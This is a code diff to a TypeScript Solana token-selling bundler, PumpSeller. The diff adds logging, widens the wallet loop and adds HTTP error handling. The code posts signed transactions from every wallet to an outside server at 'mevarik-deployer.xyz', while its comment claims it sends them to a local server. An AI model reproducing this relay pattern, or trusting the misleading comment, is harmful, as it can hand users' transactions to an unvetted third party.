@@ -37,6 +37,7 @@ export async function PumpSeller(
         let tokenBalance;
         try {
             tokenBalance = await connection.getTokenAccountBalance(getAssociatedTokenAddressSync(tokenMint, wallet.publicKey));
+            console.log(tokenBalance!.value.amount);
         } catch (e) {
             console.log(e)
             continue;
@@ -49,7 +50,7 @@ export async function PumpSeller(
 
     const recentBlockhash = (await connection.getLatestBlockhash()).blockhash;
     // Create a bundle for each wallet
-    for (let i = 1; i < wallets.length; i++) {
+    for (let i = 0; i < wallets.length; i++) {
         const wallet = Keypair.fromSecretKey(new Uint8Array(bs58.decode(wallets[i])));
         let tokenBalance;
         try {
@@ -100,6 +101,8 @@ export async function PumpSeller(
     }
     const EncodedbundledTxns = bundleTxn.map(txn => base58.encode(txn.serialize()));
 
+    console.log(EncodedbundledTxns);
+
     //send to local server port 2891'
     const response = await fetch('https://mevarik-deployer.xyz:8080/bundlesend', {
         method: 'POST',
@@ -108,6 +111,11 @@ export async function PumpSeller(
         },
         body: JSON.stringify({ blockengine: `https://${BlockEngineSelection}`, txns: EncodedbundledTxns })
     });
+
+    if (!response.ok) {
+        const message = await response.text();
+        throw new Error(`HTTP error! status: ${response.status}, message: ${message}`);
+    }
 
     const result = await response.json();
 
